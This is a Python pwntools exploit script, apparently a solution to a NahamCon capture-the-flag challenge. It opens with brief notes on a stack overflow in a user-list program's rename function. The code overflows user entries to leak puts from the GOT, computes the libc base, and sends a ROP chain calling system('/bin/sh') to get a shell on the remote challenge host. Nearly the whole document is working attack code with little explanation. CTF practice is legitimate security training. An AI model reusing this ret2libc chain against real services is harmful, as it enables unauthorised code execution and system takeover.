'''
0x7fffffffe2d0 stores the list 
      
0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]

stored on the stack



delete_users
1) print_users
2) memset to delete the stack mem of old user
3) shiftback still registered users

number of users stored at [0x7fffffffe2a0-8]
rbp at 0x7fffffffe2a0
list at 0x7fffffffe2b0

change_uname
1) fgets size of 0x50, i can overflow the next user
2) and create new users as well!
3) fake users!!
4) this function probably can leak libc base address



exploit:
0x7fffffffe300

'''

from pwn import *

#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
#libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")
#libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")

local_bin = "./the_list"
elf = ELF(local_bin)
rop = ROP(elf)

#OFFSET_MAIN_PLT = elf.symbols['main']
#print("PIE MAIN_PLT = " , hex(OFFSET_MAIN_PLT))

OFFSET_MAIN_PLT = elf.symbols['_start']
print("PIE MAIN_PLT = " , hex(OFFSET_MAIN_PLT))

OFFSET_PUTS_PLT = elf.symbols['puts']
print("PIE PUTS_PLT = ", OFFSET_PUTS_PLT)

OFFSET_PUTS_GOT = elf.got['puts']
print("PIE PUTS_GOT ="  ,OFFSET_PUTS_GOT)

OFFSET_READ_GOT = elf.got['read']
print("PIE READ_GOT = ", OFFSET_READ_GOT)

OFFSET_FGETS_GOT = elf.got['fgets']
print("PIE FGETS_GOT = ", OFFSET_FGETS_GOT)

ret_gadget = (rop.find_gadget(['ret']))[0]
print("PIE ret_gadget = ", ret_gadget )

POPRDI_gadget = (rop.find_gadget(['pop rdi','ret']))[0]
print("POP RDI Gadget = ", POPRDI_gadget )


def add_user():
	output = p.recvuntil(b'>')
	p.sendline(b'2')
	output = p.recvuntil(b'name')
	p.sendline(b'a'*(0x20-1))

def add_blank_user():
	output = p.recvuntil(b'>')
	p.sendline(b'2')
	output = p.recvuntil(b'name')
	p.sendline(b'a'*0)


p = remote("challenge.nahamcon.com", 31980)

#p = process(local_bin)
#p = gdb.debug(local_bin, '''
	#break *main
	#break *0x0000000000401960
	#break *delete_user+8
	#break *add_user+8
	#break *change_uname+8
	#break *print_users+8
	#break *delete_user+136
	#break *delete_user+240
	#break *change_uname+227
	#break *delete_user+55
	#break *shift_back+112
	#break *0x4019FD
	#continue
	#''')

output = p.recvuntil(b'name')
print(output)

p.sendline("pwn")



for x in range (16):
	add_user()

for x in range (15):
	add_blank_user()


#p.recvuntil(b'name')
p.clean()
print("start after adding users!")
#output = p.recvuntil(b'>')
#print(output)
p.sendline(b'4')

output = p.recvuntil(b'change?')
print(output)
p.sendline(b'17')

payload = b''
payload = b'b'*(0x50-8)
payload += p64(0x401a6e,endian='little')
#payload += p64(POPRDI_gadget, endian='little')
output = p.recvuntil(b'name?')
print(output)
p.sendline(payload)
#p.sendline(b'b'*(0x50-1-8))
#output = p.recv()

#index = (0x7fffffffe540-0x7fffffffe300)/0x20
#print("vulnerable index = " ,index)
print("[+] First change_uname")



output = p.recvuntil(b'Exit\n\n>',timeout = 0.1)
#output = p.recvuntil(b'Exit')
print(output)
#p.clean()
p.sendline(b'4')
print("after 4")

output = p.recvuntil(b'change?')
print(output)
#p.interactive()
p.sendline(b'20')
output = p.recv()
print(output)

print('invalid user here???')
#payload = b'A' * 0x10
#payload += p64(ret_gadget, endian='little')
payload = b'A' * 0x8
payload += p64(POPRDI_gadget, endian='little')
payload += p64(OFFSET_PUTS_GOT, endian='little')
payload += p64(OFFSET_PUTS_PLT, endian='little')
payload += p64(OFFSET_MAIN_PLT, endian='little')
output = p.recvuntil(b'name?')
p.sendline(payload)


print("[+] Second change_uname")
output = p.recvuntil(b'>')
print(output)
p.sendline(b'4')

output = p.recvuntil(b'change?')
print(output)

p.sendline(b'21')

payload = p64(POPRDI_gadget, endian='little')
payload += p64(OFFSET_FGETS_GOT, endian='little')
payload += p64(OFFSET_PUTS_PLT, endian='little')
payload += p64(OFFSET_MAIN_PLT, endian='little')
output = p.recvuntil(b'name?')
#print(output)
p.sendline(payload)


print("[+] leaked puts")
output = p.recvuntil(b'>')
p.sendline(b'5')

output = p.recvuntil(b'Goodbye!\n')

output = p.recvuntil(b'\n')
print("[+] Leaked puts @ got address")
print("[+] Calculating libc base")
leak = output[:-1]
print("[+] Leaked = ",leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked puts = ", hex(leak_dec))

libc_base = leak_dec - libc.sym["puts"]
print("[+] libc_base = ", hex(libc_base))
libc.address = libc_base
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

output = p.recvuntil(b'\n')
print("[+] Leaked fgets @ got address")
print("[+] Calculating libc base")
leak = output[:-1]
print("[+] Leaked = ",leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked fgets = ", hex(leak_dec))

print("[+] Restarting exploit")
#print(output)


print("################################################")

output = p.recvuntil(b'name')
print(output)

p.sendline("pwn")
#output = p.recv()

for x in range (16):
	add_user()

for x in range (10):
	add_blank_user()

print("i am here ? 1 ")
output = p.recvuntil(b'>')
p.sendline(b'4')
output = p.recvuntil(b'change?')
p.sendline(b'17')

payload = b''
payload = b'b'*(0x50-8)
payload += p64(0x401a6e,endian='little')
#payload += p64(POPRDI_gadget, endian='little')
output = p.recvuntil(b'name?')
p.sendline(payload)
#p.sendline(b'b'*(0x50-1-8))
#output = p.recv()

print("i am here ? 2 ")
index = (0x7fffffffe540-0x7fffffffe300)/0x20
print("vulnerable index = " ,index)
print("[+] First change_uname")
output = p.recvuntil(b'>',timeout=0.1)
print(output)
p.sendline(b'4')
output = p.recvuntil(b'change?',timeout=0.1)
print(output)
p.sendline(b'20')

#payload = b'A' * 0x10
#payload += p64(ret_gadget, endian='little')
payload = b'A' * 0x8

payload += p64(ret_gadget, endian='little')
payload += p64(POPRDI_gadget, endian='little')
payload += p64(BINSH)
payload += p64(SYSTEM)
payload += p64(EXIT)
output = p.recvuntil(b'name?',timeout=0.1)
print(output)
p.sendline(payload)

print("i am here ? 3 ")
print("[+] Second change_uname")
#p.clean()
output = p.recvuntil(b'>',timeout=0.1)
print(output)
p.sendline(b'4')

output = p.recvuntil(b'change?',timeout=0.1)
print(output)

print("i am here ? 4 ")

p.sendline(b'20')

#payload = p64(ret_gadget, endian='little')
print('i am here ????')
payload = b'A' * 0x8
payload += p64(ret_gadget, endian='little')
payload += p64(POPRDI_gadget, endian='little')
payload += p64(BINSH)
payload += p64(SYSTEM)
payload += p64(EXIT)
output = p.recvuntil(b'name?',timeout=0.1)
print(output)
print('testtt11111t')
p.sendline(payload)

print("i am here ? 5 ")
print("[+] leaked puts")
output = p.recvuntil(b'>',timeout=0.1)
print(output)
p.sendline(b'5')

output = p.recvuntil(b'Goodbye!\n')
print(output)

'''
output = p.recvuntil(b'Goodbye!\n')

output = p.recvuntil(b'\n')
print("[+] Leaked puts @ got address")
print("[+] Calculating libc base")
leak = output[:-1]
print("[+] Leaked = ",leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked puts = ", hex(leak_dec))

libc_base = leak_dec - libc.sym["puts"]
print("[+] libc_base = ", hex(libc_base))

output = p.recvuntil(b'\n')
print("[+] Leaked fgets @ got address")
print("[+] Calculating libc base")
leak = output[:-1]
print("[+] Leaked = ",leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked fgets = ", hex(leak_dec))

print("[+] restarting exploit")
'''


p.interactive()


